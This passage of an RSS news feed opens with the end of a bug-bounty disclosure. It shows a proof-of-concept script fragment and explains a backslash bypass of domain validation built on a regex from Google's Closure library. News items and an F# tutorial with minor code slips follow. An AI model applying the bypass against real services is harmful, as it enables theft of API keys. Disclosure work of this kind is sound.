    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;h1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;h1&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;h1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Your API key: &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Here is the POC video I sent to Google which shows this in action:&lt;/p&gt;
&lt;iframe width=&quot;100%&quot; height=&quot;315px&quot; src=&quot;https://www.youtube.com/embed/F4DhJDV5sDs&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;[embedded content]&lt;/iframe&gt;
&lt;p&gt;At this point, I had mixed feeling about this, since this had quite a low impact. You could only “steal” API keys or OAuth Client ID’s. Cliend ID’s without the secrets are &lt;em&gt;meh&lt;/em&gt;, and if you wanted to generate an API key for an API that was paid (with required billing), it required user interaction. So essentially this was a pretty low/medium impact bug.&lt;/p&gt;
&lt;p&gt;Then I had this thought that this regex looks way too overkill to be created exclusively for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;henhouse&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;I started grepping JS files in other Google products, and yep, this regex was everywhere. I found this regex in the &lt;strong&gt;Google Cloud Console&lt;/strong&gt;’s JS, &lt;strong&gt;Google Actions Console&lt;/strong&gt;’s JS, in &lt;strong&gt;YouTube Studio&lt;/strong&gt;, in &lt;strong&gt;myaccount.google.com&lt;/strong&gt; (!) and even in some Google Android Apps.&lt;/p&gt;
&lt;p&gt;A day later I even found this line in the Google Corp Login Page (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login.corp.google.com&lt;/code&gt;):&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;goog$uri$utils$splitRe_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;THE_MAGIC_REGEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;After this, I was sure this is something bigger then just the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;henhouse&lt;/code&gt;. Anywhere this regex is used to do domain validation with the similar “ends-with” logic, it can be bypassed with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; character.&lt;/p&gt;
&lt;p&gt;Two days after reporting, I got this response:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bugs.xdavidhu.me/assets/posts/2020-03-08-the-unexpected-google-wide-domain-check-bypass/triage-message.png&quot; alt=&quot;The Triage Message&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Few weeks later, I was watching &lt;a href=&quot;https://youtu.be/lG7U3fuNw3A?t=710&quot; target=&quot;_blank&quot;&gt;LiveOverFlow’s ‘XSS on Google Search’ video&lt;/a&gt;, where he mentioned that “But Google’s JavaScript code is actually Open Source!”. And then he showed “Google’s common JavaScript library”, the Closure libary.&lt;/p&gt;
&lt;p&gt;I immediately was like: “Wait a minute, did I found a bug in this library?”&lt;/p&gt;
&lt;p&gt;I quickly opened the &lt;a href=&quot;https://github.com/google/closure-library&quot; target=&quot;_blank&quot;&gt;Closure libary GitHub repo&lt;/a&gt;, and looked at the commits. And &lt;a href=&quot;https://github.com/google/closure-library/commit/ac0736b578df04ca23cc0fbf157824e57631c840&quot; target=&quot;_blank&quot;&gt;this is what I found&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bugs.xdavidhu.me/assets/posts/2020-03-08-the-unexpected-google-wide-domain-check-bypass/closure-commit.png&quot; alt=&quot;The Commit in the Closure Library&quot;/&gt;&lt;/p&gt;
&lt;p&gt;With this change:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bugs.xdavidhu.me/assets/posts/2020-03-08-the-unexpected-google-wide-domain-check-bypass/closure-commit-content.png&quot; alt=&quot;The Content of the Commit&quot;/&gt;&lt;/p&gt;
&lt;p&gt;That is mee! :D&lt;/p&gt;
&lt;p&gt;So this was the story if me trying to bypass a small app’s URL validation and accidentally finding a bug in Google’s common JavaScript library! I hope you enjoyed!&lt;/p&gt;
&lt;p&gt;You can follow me on Twitter: &lt;a href=&quot;https://twitter.com/xdavidhu&quot; target=&quot;_blank&quot;&gt;@xdavidhu&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;timeline&quot;&gt;Timeline:&lt;/h3&gt;
&lt;p&gt;[Jan 04, 2020] - Bug reported&lt;br/&gt;[Jan 06, 2020] - Initial triage&lt;br/&gt;[Jan 06, 2020] - Bug accepted (P4 -&amp;gt; P1)&lt;br/&gt;[Jan 17, 2020] - Reward of $6000 issued&lt;br/&gt;[Mar 06, 2020] - Bug fixed&lt;/p&gt;
</description>
<pubDate>Mon, 09 Mar 2020 18:03:21 +0000</pubDate>
<dc:creator>notRobot</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://bugs.xdavidhu.me/google/2020/03/08/the-unexpected-google-wide-domain-check-bypass/</dc:identifier>
</item>
<item>
<title>S&amp;P 500 Plunges 7%, Triggering Market-Wide Stock Trading Halt</title>
<link>https://www.bloomberg.com/news/articles/2020-03-08/rout-in-u-s-stock-futures-would-trigger-trading-curbs-at-5</link>
<guid isPermaLink="true" >https://www.bloomberg.com/news/articles/2020-03-08/rout-in-u-s-stock-futures-would-trigger-trading-curbs-at-5</guid>
<description>[unable to retrieve full-text content]
&lt;p&gt;Article URL: &lt;a href=&quot;https://www.bloomberg.com/news/articles/2020-03-08/rout-in-u-s-stock-futures-would-trigger-trading-curbs-at-5&quot;&gt;https://www.bloomberg.com/news/articles/2020-03-08/rout-in-u-s-stock-futures-would-trigger-trading-curbs-at-5&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=22527167&quot;&gt;https://news.ycombinator.com/item?id=22527167&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Points: 404&lt;/p&gt;
&lt;p&gt;# Comments: 541&lt;/p&gt;
</description>
<pubDate>Mon, 09 Mar 2020 17:12:50 +0000</pubDate>
<dc:creator>zzeder</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.bloomberg.com/tosv2.html?vid=&amp;uuid=b68fe340-626a-11ea-9e07-77942f595209&amp;url=L25ld3MvYXJ0aWNsZXMvMjAyMC0wMy0wOC9yb3V0LWluLXUtcy1zdG9jay1mdXR1cmVzLXdvdWxkLXRyaWdnZXItdHJhZGluZy1jdXJicy1hdC01</dc:identifier>
</item>
<item>
<title>“Just walk out” technology by Amazon</title>
<link>https://justwalkout.com/</link>
<guid isPermaLink="true" >https://justwalkout.com/</guid>
<description>&lt;p&gt;In Just Walk Out-enabled stores, shoppers enter the store using a credit card. They don't need to download an app or create an Amazon account. Our Just Walk Out technology detects what products shoppers take from or return to the shelves and keeps track of them in a virtual cart. When done shopping, they can just walk out and their credit card will be charged for the items in their virtual cart. If shoppers need a receipt, they can visit a kiosk in the store and enter their email address. A receipt will be emailed to them for this trip. If they use the same credit card to enter this or any other Just Walk Out-enabled store in the future, a receipt will be emailed to them automatically.&lt;/p&gt;
</description>
<pubDate>Mon, 09 Mar 2020 16:17:05 +0000</pubDate>
<dc:creator>bookofjoe</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://justwalkout.com/</dc:identifier>
</item>
<item>
<title>Robinhood goes down again, during another historic trading day</title>
<link>https://www.cnbc.com/2020/03/09/robinhood-app-down-again-during-another-historic-trading-day.html</link>
<guid isPermaLink="true" >https://www.cnbc.com/2020/03/09/robinhood-app-down-again-during-another-historic-trading-day.html</guid>
<description>&lt;div class=&quot;group&quot; readability=&quot;26.022750775595&quot;&gt;
&lt;p&gt;Free stock-trading pioneer Robinhood experienced another major outage Monday, keeping clients on the sidelines during another historic day for stocks. &lt;/p&gt;
&lt;p&gt;&quot;Trading is currently down on Robinhood and we're investigating the issue,&quot; the Silicon Valley start-up said Monday shortly after the opening bell. &quot;We are experiencing issues with equities, options and crypto trading. We are working to resolve this issue as soon as possible.&quot; &lt;/p&gt;

&lt;p&gt;Around 10:30 a.m. Robinhood tweeted that the platform was partially restored and only the fractional trades service was down. However, twitter members continued to post photos of errors from their Robinhood apps. &lt;/p&gt;
&lt;p&gt;The outage coincided with a dismal day for stocks on Monday. The major averages cratered as investors braced for the economic fallout from the coronavirus and a shocking all-out oil price war. The &lt;a href=&quot;https://www.cnbc.com/quotes/?symbol=.DJI&quot;&gt;Dow Jones Industrial Average&lt;/a&gt; tanked 2,000 points, while the &lt;a href=&quot;https://www.cnbc.com/quotes/?symbol=.SPX&quot;&gt;S&amp;amp;P 500&lt;/a&gt; plunged 7.6%. The Nasdaq Composite fell 7.3%. &lt;/p&gt;
&lt;/div&gt;

&lt;div class=&quot;group&quot; readability=&quot;41.110980622431&quot;&gt;
&lt;p&gt;The heavy volume sell-off triggered a &lt;a href=&quot;https://www.cnbc.com/2020/03/09/sp-500-futures-are-frozen-after-tanking-5percent-heres-what-happens-when-circuit-breakers-kick-in.html&quot;&gt;key market circuit breaker&lt;/a&gt; minutes into the opening bell. Trading was halted for 15 minutes until reopening at 9:49 a.m. ET. &lt;/p&gt;
&lt;p&gt;Robinhood's outage comes after days of technical problems &lt;a href=&quot;https://www.cnbc.com/2020/03/02/robinhood-says-its-experiencing-a-system-wide-outage-as-markets-rebound-in-heavy-volume-monday.html&quot;&gt;starting on Monday, March 2&lt;/a&gt;, when clients missed out on the biggest one-day point gain in Dow in history. The millennial-favored app, which has about 10 million users, was plagued with glitches for two days, causing a wave of furious clients. &lt;/p&gt;
&lt;p&gt;The company &lt;a href=&quot;https://www.cnbc.com/2020/03/05/robinhood-client-files-class-action-suit-for-negligence-over-outages.html&quot;&gt;is facing legal fallout from last week's outage&lt;/a&gt;. A Robinhood client based in Sarasota, Florida, filed a federal lawsuit on behalf of himself and other traders Wednesday evening. Travis Taaffe alleges that Robinhood was negligent and breached its contract by failing to &quot;provide a functioning platform,&quot; leaving traders unable to move money while stock markets surged. &lt;/p&gt;

&lt;p&gt;Robinhood users &lt;a href=&quot;https://www.cnbc.com/2020/03/03/trading-app-robinhood-experiencing-major-outage-for-a-second-day-amid-heavy-volume-market-action.html&quot;&gt;took to social media&lt;/a&gt; to vent outrage over the technical issues. A Twitter account &quot;Robinhood Class Action&quot; gained more than 7,000 followers in recent days.&lt;/p&gt;
&lt;p&gt;The trading app gained popularity with young investors by offering free stock trading in 2013; however, since then, free trading has become industry standard, with major online brokers dropping commissions last year. Many twitter users said that would be canceling their account with Robinhood due to the persistent technical issues. &lt;/p&gt;
&lt;p&gt;Robinhood's 44-page customer agreement outlines that it will not be responsible for &quot;temporary interruptions in service due to maintenance, Website or App changes, or failures&quot; and isn't liable for extended interruptions due to failures &quot;beyond&quot; the company's control.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WATCH:&lt;/strong&gt; &lt;a href=&quot;https://www.cnbc.com/video/2020/03/04/robinhood-system-wide-outages-squawk-box-panel.html&quot;&gt;How regulators may respond to Robinhood's system-wide outages&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;



</description>
<pubDate>Mon, 09 Mar 2020 14:16:36 +0000</pubDate>
<dc:creator>ericliuche</dc:creator>
<og:type>article</og:type>
<og:title>Robinhood goes down again, causing clients to miss out on another historic trading day</og:title>
<og:description>Robinhood is experiencing another major outage on Monday.</og:description>
<og:url>https://www.cnbc.com/2020/03/09/robinhood-app-down-again-during-another-historic-trading-day.html</og:url>
<og:image>https://image.cnbcfm.com/api/v1/image/104967390-Detail-Screens.jpg?v=1544713815</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnbc.com/2020/03/09/robinhood-app-down-again-during-another-historic-trading-day.html</dc:identifier>
</item>
<item>
<title>Trading halted as U.S. stocks plummet</title>
<link>https://www.axios.com/stocks-plunge-oil-coronavirus-a0c07880-f299-4829-87b0-81f5c5e93661.html</link>
<guid isPermaLink="true" >https://www.axios.com/stocks-plunge-oil-coronavirus-a0c07880-f299-4829-87b0-81f5c5e93661.html</guid>
<description>&lt;p&gt;The stock market fell as much as 7% on Monday morning — a decline so steep that trading was halted for 15 minutes.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Why it matters&lt;/strong&gt;: The massive sell-off points to Wall Street's anxiety about the global economy. The steep declines come as Saudi Arabia launched an oil price war against Russia over the weekend, while the coronavirus outbreak worsened.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;What's going on:&lt;/strong&gt; Under &quot;circuit breaker&quot; rules, stocks resume trading 15 minutes after the halt. The halt on Monday morning was the first since the rules were implemented after the Great Recession.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;If there's a subsequent drop of 13% from the last trading close, there will be another 15-minute trading halt.&lt;/li&gt;
&lt;li&gt;If there's a 20% drop at any point, that would halt trading for the rest of the day.&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Mon, 09 Mar 2020 13:41:36 +0000</pubDate>
<dc:creator>batmenace</dc:creator>
<og:title>Trading halted as U.S. stocks plummet</og:title>
<og:type>article</og:type>
<og:url>https://www.axios.com/stocks-plunge-oil-coronavirus-a0c07880-f299-4829-87b0-81f5c5e93661.html</og:url>
<og:image>https://images.axios.com/TgFTzJPeEKRM7FKISxhgFdIwpvM=/2020/03/09/1583758924070.jpg</og:image>
<og:description>It points to Wall Street’s anxiety about the global economy.</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.axios.com/stocks-plunge-oil-coronavirus-a0c07880-f299-4829-87b0-81f5c5e93661.html</dc:identifier>
</item>
<item>
<title>Defunctionalisation: An underappreciated tool for writing good software</title>
<link>https://www.gresearch.co.uk/article/defunctionalisation/</link>
<guid isPermaLink="true" >https://www.gresearch.co.uk/article/defunctionalisation/</guid>
<description>&lt;p&gt;&lt;em&gt;Patrick Stevens is a Developer at G-Research.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;I work in an engineering team at G-Research dedicated to creating performant and correct libraries for our quant researchers to use. In the process of achieving this goal, we have settled on a number of patterns to make it easier to write code that is both correct and amenable to optimisation, and I’d like to explain one such pattern in this blog post. My personal motto distilled from these patterns is “load as much information as you can into the type system, so that the computer can tell you what to write”, and this post can be viewed as exploring an aspect of that philosophy.&lt;/p&gt;
&lt;p&gt;We have talked about “initial algebras” &lt;a href=&quot;https://github.com/nickcowle/Talks/blob/3babf57d01db905ef057624250543753acfde4cb/Initial%20Algebras%20for%20the%20Uninitiated.pdf&quot;&gt;at some length&lt;/a&gt;; this post is to discuss &lt;em&gt;defunctionalisation&lt;/em&gt; as a complementary technique. Defunctionalisation is a well-known technique among compiler writers, but I consider it to be under-appreciated as a tool for writing good software more generally. It pairs up particularly well with the “initial algebra” pattern.&lt;/p&gt;

&lt;p&gt;Recall that the initial algebra pattern, in a nutshell, is “don’t manipulate &lt;em&gt;things&lt;/em&gt;, but instead manipulate &lt;em&gt;descriptions of those things.&lt;/em&gt;” An ideal program written using the initial algebra pattern is essentially a “compilation pipeline” of successive refinements to these descriptions, until finally the descriptions contain all the information required to produce a performant program; whereupon it is easy to construct that program. More philosophically, “don’t throw away information; instead, refine the information as much as possible, and only turn it into an actual program as late as possible”.&lt;/p&gt;
&lt;p&gt;The initial algebra pattern, used correctly, has a number of advantages, all related to each other.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;The “compilation pipeline” of successively refined descriptions is very inspectable.&lt;/strong&gt; At any point during this “compilation”, you can explore the current structure of the descriptions you have made so far.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Keeping as much information as possible means you have more scope to optimise&lt;/strong&gt;. For example, if your library takes as input a description of what the user wants to do, you have complete freedom to notice any redundancy or inefficiency in the user’s description before you ever start producing any concrete output.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Such programs are very easy to test&lt;/strong&gt;. They are naturally modular in structure (as implied by the pipeline metaphor).&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;But while the initial algebra pattern helps a lot in writing correct software that can also be made performant, it is still very possible to use it such a way as to nullify the benefits above; and this is where defunctionalisation comes in.&lt;/p&gt;
&lt;p&gt;In brief, “defunctionalisation” means “converting programs into specifications of programs, and only later on interpreting those specifications back into programs”. Defunctionalisation is to &lt;em&gt;program structure&lt;/em&gt; as the initial algebra is to &lt;em&gt;datatype structure&lt;/em&gt;; a defunctionalised program can be thought of as a program which first describes what it will do, and then does it. This might seem like needless complexity, but in fact it can be extraordinarily helpful to separate the logic of your programs in this way.&lt;/p&gt;
&lt;h2 id=&quot;how-could-the-initial-algebra-pattern-be-misused-and-how-does-defunctionalisation-help-&quot;&gt;How could the initial algebra pattern be misused, and how does defunctionalisation help?&lt;/h2&gt;
&lt;p&gt;We will discuss the three benefits of the initial algebra pattern listed above, and we will indicate how these benefits can be subverted by careless design. The first two benefits will use the same example; the third (“testability”) is best demonstrated by adding a little more complexity, so will use a different example.&lt;/p&gt;
&lt;p&gt;It’s true that both these examples are somewhat contrived; they are designed to highlight specific principles without any of the distractions that might make the code a little more realistic. Rest assured that the principles continue to hold in real code.&lt;/p&gt;
&lt;h3 id=&quot;inspectability&quot;&gt;Inspectability&lt;/h3&gt;
&lt;p&gt;The first of the benefits listed above was “inspectability”.&lt;/p&gt;
&lt;p&gt;For this section and the next, let us imagine the guts of a very basic calculator application, expressed in the initial algebra style. Perhaps this calculator has a graphical user interface with a &lt;code&gt;+&lt;/code&gt; button and a unary &lt;code&gt;-&lt;/code&gt; button, and the GUI constructs an expression which represents the user’s input before that input is handed off to a library for processing. The library will take an &lt;code&gt;Expr&lt;/code&gt; as its input, defined below, and it will interpret that input into an &lt;code&gt;int&lt;/code&gt;, thereby performing the calculation specified.&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;lang-fsharp&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;Expr&lt;/span&gt; =
  | &lt;span class=&quot;hljs-type&quot;&gt;Const&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt;
  | &lt;span class=&quot;hljs-type&quot;&gt;CustomOneArg&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; (&lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt; -&amp;gt; &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt;) * &lt;span class=&quot;hljs-type&quot;&gt;Expr&lt;/span&gt;
  | &lt;span class=&quot;hljs-type&quot;&gt;CustomTwoArgs&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; (&lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt; -&amp;gt; &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt; -&amp;gt; &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt;) * &lt;span class=&quot;hljs-type&quot;&gt;Expr&lt;/span&gt; * &lt;span class=&quot;hljs-type&quot;&gt;Expr&lt;/span&gt;

&lt;span class=&quot;hljs-keyword&quot;&gt;module&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;Expr&lt;/span&gt; =
  &lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; interpret (e : &lt;span class=&quot;hljs-type&quot;&gt;Expr&lt;/span&gt;) : &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt; =
    &lt;span class=&quot;hljs-keyword&quot;&gt;match&lt;/span&gt; e &lt;span class=&quot;hljs-keyword&quot;&gt;with&lt;/span&gt;
    | &lt;span class=&quot;hljs-type&quot;&gt;Const&lt;/span&gt; a -&amp;gt; a
    | &lt;span class=&quot;hljs-type&quot;&gt;CustomOneArg&lt;/span&gt; (f, a) -&amp;gt; f (interpret a)
    | &lt;span class=&quot;hljs-type&quot;&gt;CustomTwoArgs&lt;/span&gt; (f, a, b) -&amp;gt; f (interpret a) (interpret b)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;So the &lt;code&gt;+&lt;/code&gt; button on this calculator produces an &lt;code&gt;Expr&lt;/code&gt; which looks like a &lt;code&gt;CustomTwoArgs ((+), a, b)&lt;/code&gt;; the &lt;code&gt;-&lt;/code&gt; button produces a &lt;code&gt;CustomOneArg ((fun x -&amp;gt; -x), a)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now, what happens if you were to pause in the middle of execution, just after the user’s input has been parsed into an &lt;code&gt;Expr&lt;/code&gt; but before we go on to call &lt;code&gt;interpret&lt;/code&gt;? Well, in your hand, perhaps you have a &lt;code&gt;CustomTwoArgs (closure&amp;lt;49&amp;gt;, (Const 3), (CustomOneArg(closure&amp;lt;103&amp;gt;, Const 9)))&lt;/code&gt;. But has this actually helped you?&lt;/p&gt;
&lt;p&gt;The resolution to this problem is very likely obvious.&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;lang-fsharp&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;OneArgFunction&lt;/span&gt; =
  | &lt;span class=&quot;hljs-type&quot;&gt;Negate&lt;/span&gt;
  | &lt;span class=&quot;hljs-type&quot;&gt;Custom&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; (&lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt; -&amp;gt; &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt;)

&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;TwoArgFunction&lt;/span&gt; =
  | &lt;span class=&quot;hljs-type&quot;&gt;Add&lt;/span&gt;
  | &lt;span class=&quot;hljs-type&quot;&gt;Subtract&lt;/span&gt;
  | &lt;span class=&quot;hljs-type&quot;&gt;Custom&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; (&lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt; -&amp;gt; &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt; -&amp;gt; &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt;)

&lt;span class=&quot;hljs-keyword&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;Expr&lt;/span&gt; =
  | &lt;span class=&quot;hljs-type&quot;&gt;Const&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt;
  | &lt;span class=&quot;hljs-type&quot;&gt;OneArg&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;OneArgFunction&lt;/span&gt; * &lt;span class=&quot;hljs-type&quot;&gt;Expr&lt;/span&gt;
  | &lt;span class=&quot;hljs-type&quot;&gt;TwoArg&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;OneArgFunction&lt;/span&gt; * &lt;span class=&quot;hljs-type&quot;&gt;Expr&lt;/span&gt; * &lt;span class=&quot;hljs-type&quot;&gt;Expr&lt;/span&gt;

&lt;span class=&quot;hljs-keyword&quot;&gt;module&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;OneArgFunction&lt;/span&gt; =
  &lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; interpret (f : &lt;span class=&quot;hljs-type&quot;&gt;OneArgFunction&lt;/span&gt;) : &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt; -&amp;gt; &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt; =
    &lt;span class=&quot;hljs-keyword&quot;&gt;match&lt;/span&gt; f &lt;span class=&quot;hljs-keyword&quot;&gt;with&lt;/span&gt;
    | &lt;span class=&quot;hljs-type&quot;&gt;Negate&lt;/span&gt; -&amp;gt; (~-)
    | &lt;span class=&quot;hljs-type&quot;&gt;Custom&lt;/span&gt; f -&amp;gt; f

&lt;span class=&quot;hljs-keyword&quot;&gt;module&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;TwoArgFunction&lt;/span&gt; =
  &lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; interpret (f : &lt;span class=&quot;hljs-type&quot;&gt;TwoArgFunction&lt;/span&gt;) : &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt; -&amp;gt; &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt; -&amp;gt; &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt; =
    &lt;span class=&quot;hljs-keyword&quot;&gt;match&lt;/span&gt; f &lt;span class=&quot;hljs-keyword&quot;&gt;with&lt;/span&gt;
    | &lt;span class=&quot;hljs-type&quot;&gt;Add&lt;/span&gt; -&amp;gt; (+)
    | &lt;span class=&quot;hljs-type&quot;&gt;Subtract&lt;/span&gt; -&amp;gt; (-)
    | &lt;span class=&quot;hljs-type&quot;&gt;Custom&lt;/span&gt; f -&amp;gt; f

&lt;span class=&quot;hljs-keyword&quot;&gt;module&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;Expr&lt;/span&gt; =
  &lt;span class=&quot;hljs-keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;rec&lt;/span&gt; interpret (e : &lt;span class=&quot;hljs-type&quot;&gt;Expr&lt;/span&gt;) : &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt; =
    &lt;span class=&quot;hljs-keyword&quot;&gt;match&lt;/span&gt; e &lt;span class=&quot;hljs-keyword&quot;&gt;with&lt;/span&gt;
    | &lt;span class=&quot;hljs-type&quot;&gt;Const&lt;/span&gt; a -&amp;gt; a
    | &lt;span class=&quot;hljs-type&quot;&gt;OneArg&lt;/span&gt; (f, x) -&amp;gt;
      (&lt;span class=&quot;hljs-type&quot;&gt;OneArgFunction&lt;/span&gt;.interpret f) (interpret x)
    | &lt;span class=&quot;hljs-type&quot;&gt;TwoArg&lt;/span&gt; (f, x, y) -&amp;gt;
      (&lt;span class=&quot;hljs-type&quot;&gt;TwoArgFunction&lt;/span&gt;.interpret f) (interpret x) (interpret y)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Hook up the &lt;code&gt;+&lt;/code&gt; button to produce the &lt;code&gt;Sum&lt;/code&gt; union case, and the &lt;code&gt;-&lt;/code&gt; button to produce the &lt;code&gt;Negate&lt;/code&gt; union case.&lt;/p&gt;
&lt;p&gt;Now it’s very likely that the debugger tells you that we are currently processing a &lt;code&gt;Sum (Const 3, Negate (Const 9))&lt;/code&gt;. Much better than the previous &lt;code&gt;CustomTwoArgs&lt;/code&gt; confusion!&lt;/p&gt;
